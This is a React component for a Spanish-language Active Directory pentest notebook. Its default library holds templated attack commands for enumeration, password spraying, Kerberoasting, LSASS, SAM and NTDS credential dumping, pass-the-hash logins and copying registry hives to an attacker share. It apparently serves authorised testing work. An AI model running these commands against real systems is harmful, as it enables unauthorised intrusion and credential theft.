import { Check, ChevronDown, ChevronRight, Pencil, Plus, Trash2, X } from "lucide-react";
import { useEffect, useState } from "react";

export const toolCategories = [
  "1. Reconocimiento",
  "2. Enumeracion inicial",
  "3. Obtencion de credenciales",
  "4. Acceso inicial",
  "5. Enumeracion autenticada",
  "6. Explotacion",
  "7. Escalada de privilegios",
  "8. Movimiento lateral",
  "9. Pivoting y post-explotacion",
  "10. Persistencia",
  "Notas Windows",
] as const;

export type ToolCategory = (typeof toolCategories)[number];
export type ToolKind = "command" | "note";

export type ToolTemplate = {
  id: string;
  group: ToolCategory;
  kind: ToolKind;
  name: string;
  tool: string;
  command: string;
  authorizedTarget: string;
  notes: string;
};

export const toolStorageKey = "ad-redteam-tool-notebook";
export const toolLibraryUpdatedEvent = "ad-redteam-tool-library-updated";
const groupOrder = new Map(toolCategories.map((category, index) => [category, index]));
const commandVariables = [
  { label: "Target IP", value: "<target_ip>" },
  { label: "IP/CIDR", value: "<ip_or_cidr>" },
  { label: "DC IP", value: "<ip_dc>" },
  { label: "Dominio", value: "<domain>" },
  { label: "Usuario", value: "<user>" },
  { label: "Password", value: "<password>" },
  { label: "Hash NT", value: "<hash_nt>" },
  { label: "Share", value: "<share>" },
  { label: "Users list", value: "<users_list>" },
  { label: "Wordlist", value: "<wordlist>" },
  { label: "Fichero", value: "<file>" },
  { label: "Puerto", value: "<port>" },
  { label: "Kali IP", value: "<kali_ip>" },
] as const;

function tool(
  id: string,
  group: ToolCategory,
  name: string,
  toolName: string,
  command: string,
  authorizedTarget: string,
  notes = "",
): ToolTemplate {
  return { id, group, kind: "command", name, tool: toolName, command, authorizedTarget, notes };
}

function note(id: string, group: ToolCategory, name: string, notes: string): ToolTemplate {
  return { id, group, kind: "note", name, tool: "nota", command: "", authorizedTarget: "localhost", notes };
}

export const defaultTools: ToolTemplate[] = [
  tool("recon-nxc-smb", "1. Reconocimiento", "NetExec SMB baseline", "nxc", "nxc smb <ip_or_cidr>", "<ip_or_cidr>"),
  tool("recon-hosts-file", "1. Reconocimiento", "Editar /etc/hosts", "nano", "nano /etc/hosts", "localhost"),
  tool("recon-rustscan-scv", "1. Reconocimiento", "RustScan + scripts/versiones", "rustscan", "rustscan -a <target_ip> --no-banner -- -sCV", "<target_ip>"),
  tool("recon-nmap-udp-top", "1. Reconocimiento", "Nmap UDP top ports", "nmap", "nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 <target_ip> -Pn", "<target_ip>"),
  tool("recon-snmp-161", "1. Reconocimiento", "Nmap UDP puerto", "nmap", "nmap -sU -p <port> <target_ip>", "<target_ip>"),
  tool("recon-proxychains-mixed", "9. Pivoting y post-explotacion", "Proxychains puertos AD", "proxychains", "proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 <target_ip>", "<target_ip>"),

  tool("enum-rpc-null", "2. Enumeracion inicial", "RPC null session", "rpcclient", "rpcclient -U \"\" <target_ip> -N", "<target_ip>"),
  tool("enum-rpc-creds", "5. Enumeracion autenticada", "RPC con credenciales", "rpcclient", "rpcclient -U \"<user>%<password>\" <target_ip>", "<target_ip>"),
  tool("enum-rpc-guest", "2. Enumeracion inicial", "RPC guest", "rpcclient", "rpcclient -U \"guest%\" <target_ip>", "<target_ip>"),
  tool("enum-nxc-smb-null-shares", "2. Enumeracion inicial", "SMB shares null", "nxc", "nxc smb <target_ip> -u '' -p '' --shares", "<target_ip>"),
  tool("enum-nxc-smb-null-rid", "2. Enumeracion inicial", "RID brute null", "nxc", "nxc smb <target_ip> -u '' -p '' --rid-brute", "<target_ip>"),
  tool("enum-nxc-smb-guest-shares", "2. Enumeracion inicial", "SMB shares guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --shares", "<target_ip>"),
  tool("enum-nxc-smb-guest-rid", "2. Enumeracion inicial", "RID brute guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --rid-brute", "<target_ip>"),
  tool("enum-nxc-users-passwords", "2. Enumeracion inicial", "Password spray user=user", "nxc", "nxc smb <target_ip> -u <users_list> -p <users_list> --no-bruteforce --continue-on-success", "<target_ip>", "Usar listas controladas. Cambia users por ficheros reales si procede."),
  tool("enum-smbclient-null-download", "2. Enumeracion inicial", "Descargar share anonimo", "smbclient", "smbclient -N //<target_ip>/<share>/ -c \"recurse; prompt; mget *;\"", "<target_ip>"),
  tool("enum-smbclient-auth-download", "9. Pivoting y post-explotacion", "Descargar share con usuario", "smbclient", "smbclient //<target_ip>/<share>/ -U <user> -c \"recurse; prompt; mget *;\"", "<target_ip>"),
  tool("enum-ldap-anon", "2. Enumeracion inicial", "LDAP anonimo", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -b 'DC=<domain_part>,DC=<domain_part>'", "<ip_dc>"),
  tool("enum-ldap-auth", "5. Enumeracion autenticada", "LDAP autenticado", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -D '<user>@<domain>' -w '<password>' -b 'DC=<domain_part>,DC=<domain_part>'", "<ip_dc>"),
  tool("enum-ldap-grep-passwords", "2. Enumeracion inicial", "Filtrar LDAP por secretos", "grep", "grep -iE \"pwd|desc|password\" -C 3 <file>", "localhost"),
  tool("enum-ldapdomaindump", "5. Enumeracion autenticada", "ldapdomaindump", "ldapdomaindump", "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip_dc>", "<ip_dc>"),
  tool("enum-neo4j-start", "2. Enumeracion inicial", "Iniciar Neo4j", "neo4j", "neo4j start", "localhost"),
  tool("enum-bloodhound-python", "5. Enumeracion autenticada", "BloodHound collection", "bloodhound-python", "bloodhound-python -u <user> -p <password> -ns <ip_dc> -d <domain> -c all", "<ip_dc>"),
  tool("enum-ntp-stop-sync", "2. Enumeracion inicial", "Parar timesyncd", "systemctl", "systemctl stop systemd-timesyncd", "localhost"),
  tool("enum-ntpdate-dc", "2. Enumeracion inicial", "Sincronizar hora con DC", "ntpdate", "ntpdate <ip_dc>", "<ip_dc>"),

  tool("cred-kerbrute-userenum", "3. Obtencion de credenciales", "Kerbrute userenum", "kerbrute", "kerbrute userenum --dc <ip_dc> -d <domain> <users_list>", "<ip_dc>"),
  tool("cred-asrep", "3. Obtencion de credenciales", "AS-REP roast", "impacket-GetNPUsers", "impacket-GetNPUsers -no-pass -usersfile <users_list> -dc-ip <ip_dc> <domain>/", "<ip_dc>"),
  tool("cred-kerberoast", "6. Explotacion", "Kerberoast", "impacket-GetUserSPNs", "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip_dc> -request -outputfile <file>", "<ip_dc>"),
  tool("cred-certipy-vuln", "6. Explotacion", "Certipy templates vulnerables", "certipy-ad", "certipy-ad find -u <user> -p <password> -dc-ip <ip_dc> -vulnerable", "<ip_dc>"),
  tool("cred-lsassy-pass", "7. Escalada de privilegios", "LSASS con password", "lsassy", "lsassy -d <domain> -u <user> -p <password> <target_ip>", "<target_ip>", "Necesita credenciales admin local."),
  tool("cred-lsassy-hash", "7. Escalada de privilegios", "LSASS con hash NT", "lsassy", "lsassy -d <domain> -u <user> -H ':<hash_nt>' <target_ip>", "<target_ip>", "Necesita credenciales admin local."),
  tool("cred-ntds", "7. Escalada de privilegios", "Dumpear NTDS con nxc", "nxc", "nxc smb <ip_dc> -u <user> -H <hash_nt> --ntds", "<ip_dc>"),
  tool("cred-secretsdump-sam-lsa", "7. Escalada de privilegios", "Secretsdump SAM + SECURITY", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL", "localhost"),
  tool("cred-secretsdump-sam", "7. Escalada de privilegios", "Secretsdump SAM", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL", "localhost"),
  tool("cred-samdump2", "7. Escalada de privilegios", "samdump2", "samdump2", "samdump2 SAM.save SYSTEM.save -o sam.txt", "localhost"),
  tool("cred-john-nt", "3. Obtencion de credenciales", "Crack NT hashes", "john", "john --format=NT --wordlist=<wordlist> <file>", "localhost"),

  tool("exploit-evil-winrm-pass", "4. Acceso inicial", "evil-winrm password", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -p <password>", "<target_ip>"),
  tool("exploit-evil-winrm-hash", "8. Movimiento lateral", "evil-winrm hash", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -H <hash_nt>", "<target_ip>"),
  tool("exploit-psexec-pass", "8. Movimiento lateral", "psexec password", "impacket-psexec", "impacket-psexec <user>@<target_ip>", "<target_ip>"),
  tool("exploit-psexec-hash", "8. Movimiento lateral", "psexec hash", "impacket-psexec", "impacket-psexec <user>@<target_ip> -hashes <LM>:<hash_nt>", "<target_ip>"),
  tool("exploit-rdp", "8. Movimiento lateral", "RDP xfreerdp", "xfreerdp", "xfreerdp /v:<target_ip>:<port> /u:<user> /p:<password>", "<target_ip>"),

  tool("infra-smbserver", "9. Pivoting y post-explotacion", "SMB server Kali", "impacket-smbserver", "impacket-smbserver recurso $(pwd) -smb2support", "localhost"),
  tool("extract-reg-backup", "9. Pivoting y post-explotacion", "Backup remoto de registry", "impacket-reg", "impacket-reg '<domain>/<user>:<password>@<ip_dc>' backup -o '\\\\<kali_ip>\\recurso'", "<ip_dc>"),
  tool("extract-nxc-sam", "9. Pivoting y post-explotacion", "Extraer SAM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --sam", "<ip_dc>"),
  tool("extract-nxc-system", "9. Pivoting y post-explotacion", "Extraer SYSTEM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --system", "<ip_dc>"),
  tool("extract-nxc-security", "9. Pivoting y post-explotacion", "Extraer SECURITY", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --security", "<ip_dc>"),

  note("note-persistencia-placeholder", "10. Persistencia", "Notas de persistencia", "Categoria preparada para ir metiendo tecnicas validadas del entorno cuando las tengas en tus notas."),
  note("note-windows-mimikatz", "Notas Windows", "Mimikatz", "Comandos Windows omitidos de ejecucion Kali: mimikatz.exe, privilege::debug, sekurlsa::logonpasswords, lsadump::sam SYSTEM SAM."),
  note("note-windows-local-enum", "Notas Windows", "Enumeracion local Windows", "Referencia: whoami /all, cmdkey /list, Get-LocalUser, PSReadLine history, WinLogon registry, WMI Description."),
  note("note-windows-reg-save", "Notas Windows", "Registry save desde Windows", "Referencia: reg.exe save hklm\\sam, hklm\\system, hklm\\security hacia \\\\<kali_ip>\\recurso."),
];

export function normalizeTool(raw: Partial<ToolTemplate>): ToolTemplate {
  const legacyGroups: Record<string, ToolCategory> = {
    Recon: "1. Reconocimiento",
    Enumeracion: "2. Enumeracion inicial",
    Credenciales: "3. Obtencion de credenciales",
    Explotacion: "6. Explotacion",
    Persistencia: "10. Persistencia",
    Extraccion: "9. Pivoting y post-explotacion",
    "Post-explotacion": "9. Pivoting y post-explotacion",
    Infra: "9. Pivoting y post-explotacion",
  };
  const group = toolCategories.includes(raw.group as ToolCategory)
    ? (raw.group as ToolCategory)
    : legacyGroups[String(raw.group)] ?? "1. Reconocimiento";
  const kind = raw.kind === "note" ? "note" : "command";

  return {
    id: raw.id || crypto.randomUUID(),
    group,
    kind,
    name: raw.name || "Nueva herramienta",
    tool: raw.tool || (kind === "note" ? "nota" : "tool"),
    command: raw.command || "",
    authorizedTarget: raw.authorizedTarget || "localhost",
    notes: raw.notes || "",
  };
}

export function mergeDefaults(current: ToolTemplate[]) {
  const defaultIds = new Set(defaultTools.map((item) => item.id));
  const customTools = current.filter((item) => !defaultIds.has(item.id));
  return [...customTools, ...defaultTools];
}

export function loadToolLibrary() {
  const saved = window.localStorage.getItem(toolStorageKey);
  if (!saved) {
    return defaultTools;
  }

  try {
    const parsed = JSON.parse(saved) as Partial<ToolTemplate>[];
    return mergeDefaults(parsed.map(normalizeTool));
  } catch {
    return defaultTools;
  }
}

function createBlankTool(): ToolTemplate {
  return tool(
    crypto.randomUUID(),
    "1. Reconocimiento",
    "",
    "nxc",
    "nxc smb <target_ip>",
    "<target_ip>",
  );
}

function VariableChips({ command }: { command: string }) {
  const variables = Array.from(new Set(command.match(/<[^>\s]+>/g) ?? []));
  if (variables.length === 0) {
    return null;
  }
  return (
    <div className="variable-chip-list">
      {variables.map((variable) => (
        <span key={variable}>{variable}</span>
      ))}
    </div>
  );
}

function VariableTagButtons({ onAdd }: { onAdd: (variable: string) => void }) {
  return (
    <div className="variable-tag-list">
      {commandVariables.map((variable) => (
        <button key={variable.value} type="button" onClick={() => onAdd(variable.value)}>
          <span>{variable.label}</span>
          <code>{variable.value}</code>
        </button>
      ))}
    </div>
  );
}

function appendCommandVariable(command: string, variable: string) {
  const trimmedCommand = command.trimEnd();
  if (!trimmedCommand) {
    return variable;
  }
  return `${trimmedCommand} ${variable}`;
}

function inferAuthorizedTarget(command: string) {
  if (command.includes("<ip_dc>")) {
    return "<ip_dc>";
  }
  if (command.includes("<target_ip>")) {
    return "<target_ip>";
  }
  if (command.includes("<ip_or_cidr>")) {
    return "<ip_or_cidr>";
  }
  return "localhost";
}

export function ToolNotebook() {
  const [tools, setTools] = useState<ToolTemplate[]>(defaultTools);
  const [drafts, setDrafts] = useState<Record<string, ToolTemplate>>({});
  const [editingId, setEditingId] = useState<string | null>(null);
  const [openGroups, setOpenGroups] = useState<Set<string>>(new Set(["1. Reconocimiento"]));
  const [newTool, setNewTool] = useState<ToolTemplate>(createBlankTool);
  const [isComposerOpen, setIsComposerOpen] = useState(false);

  useEffect(() => {
    setTools(loadToolLibrary());
  }, []);

  function persist(nextTools: ToolTemplate[]) {
    const normalized = nextTools.map(normalizeTool);
    setTools(normalized);
    window.localStorage.setItem(toolStorageKey, JSON.stringify(normalized));
    window.dispatchEvent(new CustomEvent(toolLibraryUpdatedEvent));
  }

  function groupedTools() {
    return toolCategories
      .map((group) => ({
        group,
        tools: tools.filter((toolItem) => toolItem.group === group),
      }))
      .filter((group) => group.tools.length > 0)
      .sort((left, right) => (groupOrder.get(left.group) ?? 99) - (groupOrder.get(right.group) ?? 99));
  }

  function startEditing(toolItem: ToolTemplate) {
    setEditingId(toolItem.id);
    setDrafts((current) => ({ ...current, [toolItem.id]: toolItem }));
  }

  function updateDraft(toolId: string, patch: Partial<ToolTemplate>) {
    const toolItem = tools.find((candidate) => candidate.id === toolId);
    if (!toolItem) {
      return;
    }

    setDrafts((current) => ({
      ...current,
      [toolId]: normalizeTool({ ...(current[toolId] ?? toolItem), ...patch }),
    }));
  }

  function saveTool(toolId: string) {
    const draft = drafts[toolId];
    if (!draft) {
      return;
    }

    persist(tools.map((toolItem) => (toolItem.id === toolId ? draft : toolItem)));
    setEditingId(null);
  }

  function addTool() {
    const normalized = normalizeTool({
      ...newTool,
      id: crypto.randomUUID(),
      name: newTool.name.trim() || newTool.tool || "Nueva herramienta",
      authorizedTarget: inferAuthorizedTarget(newTool.command),
    });
    persist([normalized, ...tools]);
    setOpenGroups((current) => new Set(current).add(normalized.group));
    setNewTool(createBlankTool());
    setIsComposerOpen(false);
  }

  function deleteTool(toolId: string) {
    persist(tools.filter((toolItem) => toolItem.id !== toolId));
  }

  function toggleGroup(group: string) {
    setOpenGroups((current) => {
      const next = new Set(current);
      if (next.has(group)) {
        next.delete(group);
      } else {
        next.add(group);
      }
      return next;
    });
  }

  function addCommandVariable(variable: string) {
    setNewTool((current) => ({
      ...current,
      command: appendCommandVariable(current.command, variable),
    }));
  }

  function addDraftCommandVariable(toolId: string, variable: string) {
    const toolItem = tools.find((candidate) => candidate.id === toolId);
    if (!toolItem) {
      return;
    }
    const draft = drafts[toolId] ?? toolItem;
    updateDraft(toolId, {
      command: appendCommandVariable(draft.command, variable),
      authorizedTarget: inferAuthorizedTarget(appendCommandVariable(draft.command, variable)),
    });
  }

  return (
    <section className="panel notebook-panel">
      <div className="panel-header">
        <div>
          <p className="eyebrow">Notebook AD</p>
          <h2>Biblioteca de herramientas</h2>
        </div>
        <button className="run-button" type="button" onClick={() => setIsComposerOpen(true)}>
          <Plus size={16} />
          Agregar herramienta
        </button>
      </div>

      {isComposerOpen ? (
        <article className="tool-composer">
          <div className="tool-template-grid">
            <label>
              Fase
              <select
                value={newTool.group}
                onChange={(event) =>
                  setNewTool((current) => normalizeTool({ ...current, group: event.target.value as ToolCategory }))
                }
              >
                {toolCategories.map((category) => (
                  <option key={category} value={category}>
                    {category}
                  </option>
                ))}
              </select>
            </label>
            <label>
              Tipo
              <select
                value={newTool.kind}
                onChange={(event) =>
                  setNewTool((current) => normalizeTool({ ...current, kind: event.target.value as ToolKind }))
                }
              >
                <option value="command">Comando Kali</option>
                <option value="note">Nota</option>
              </select>
            </label>
            <label>
              Nombre
              <input
                value={newTool.name}
                onChange={(event) => setNewTool((current) => ({ ...current, name: event.target.value }))}
                placeholder="Kerbrute userenum"
              />
            </label>
            <label>
              Herramienta
              <input
                value={newTool.tool}
                onChange={(event) => setNewTool((current) => ({ ...current, tool: event.target.value }))}
                placeholder="kerbrute"
              />
            </label>
          </div>
          {newTool.kind === "command" ? (
            <>
              <VariableTagButtons onAdd={addCommandVariable} />
              <textarea
                value={newTool.command}
                onChange={(event) => setNewTool((current) => ({ ...current, command: event.target.value }))}
                placeholder="Comando con variables: <target_ip>, <user>, <password>, <domain>"
              />
              <VariableChips command={newTool.command} />
            </>
          ) : null}
          <textarea
            className="notes-editor"
            value={newTool.notes}
            onChange={(event) => setNewTool((current) => ({ ...current, notes: event.target.value }))}
            placeholder="Notas, permisos necesarios, evidencia esperada"
          />
          <div className="command-actions">
            <button className="run-button" type="button" onClick={addTool}>
              <Plus size={16} />
              Guardar herramienta
            </button>
            <button
              className="icon-button secondary"
              type="button"
              onClick={() => {
                setNewTool(createBlankTool());
                setIsComposerOpen(false);
              }}
            >
              <X size={15} />
            </button>
          </div>
        </article>
      ) : null}

      <div className="notebook-groups">
        {groupedTools().map((group) => (
          <section className="notebook-group" key={group.group}>
            <button className="notebook-group-heading" type="button" onClick={() => toggleGroup(group.group)}>
              {openGroups.has(group.group) ? <ChevronDown size={16} /> : <ChevronRight size={16} />}
              <strong>{group.group}</strong>
              <span>{group.tools.length}</span>
            </button>
            {openGroups.has(group.group) && (
            <div className="tool-template-list">
              {group.tools.map((toolItem) => {
                const isEditing = editingId === toolItem.id;
                const draft = drafts[toolItem.id] ?? toolItem;

                return (
                  <article className="tool-template" key={toolItem.id}>
                    {isEditing ? (
                      <>
                        <div className="tool-template-grid">
                          <select
                            value={draft.group}
                            onChange={(event) =>
                              updateDraft(toolItem.id, { group: event.target.value as ToolCategory })
                            }
                          >
                            {toolCategories.map((category) => (
                              <option key={category} value={category}>
                                {category}
                              </option>
                            ))}
                          </select>
                          <select
                            value={draft.kind}
                            onChange={(event) =>
                              updateDraft(toolItem.id, { kind: event.target.value as ToolKind })
                            }
                          >
                            <option value="command">Comando Kali</option>
                            <option value="note">Nota</option>
                          </select>
                          <input
                            value={draft.name}
                            onChange={(event) => updateDraft(toolItem.id, { name: event.target.value })}
                            placeholder="Nombre"
                          />
                          <input
                            value={draft.tool}
                            onChange={(event) => updateDraft(toolItem.id, { tool: event.target.value })}
                            placeholder="Tool"
                          />
                        </div>
                        {draft.kind === "command" ? (
                          <>
                            <VariableTagButtons
                              onAdd={(variable) => addDraftCommandVariable(toolItem.id, variable)}
                            />
                            <textarea
                              value={draft.command}
                              onChange={(event) => updateDraft(toolItem.id, { command: event.target.value })}
                              placeholder="Comando"
                            />
                            <VariableChips command={draft.command} />
                          </>
                        ) : null}
                        <textarea
                          className="notes-editor"
                          value={draft.notes}
                          onChange={(event) => updateDraft(toolItem.id, { notes: event.target.value })}
                          placeholder="Notas"
                        />
                        <div className="command-actions">
                          <button className="icon-button" type="button" onClick={() => saveTool(toolItem.id)}>
                            <Check size={15} />
                          </button>
                          <button
                            className="icon-button secondary"
                            type="button"
                            onClick={() => setEditingId(null)}
                          >
                            <X size={15} />
                          </button>
                        </div>
                      </>
                    ) : (
                      <>
                        <div className="tool-template-title">
                          <strong>{toolItem.name}</strong>
                          <span>{toolItem.kind === "command" ? "Kali" : "Nota"}</span>
                          <span>{toolItem.tool}</span>
                          <span>{toolItem.authorizedTarget}</span>
                        </div>
                        {toolItem.kind === "command" ? <code>{toolItem.command}</code> : null}
                        {toolItem.notes ? <p className="tool-notes">{toolItem.notes}</p> : null}
                        <div className="command-actions">
                          <button
                            className="icon-button secondary"
                            type="button"
                            onClick={() => startEditing(toolItem)}
                          >
                            <Pencil size={15} />
                          </button>
                          <button
                            className="icon-button danger"
                            type="button"
                            onClick={() => deleteTool(toolItem.id)}
                          >
                            <Trash2 size={15} />
                          </button>
                        </div>
                      </>
                    )}
                  </article>
                );
              })}
            </div>
            )}
          </section>
        ))}
      </div>
    </section>
  );
}
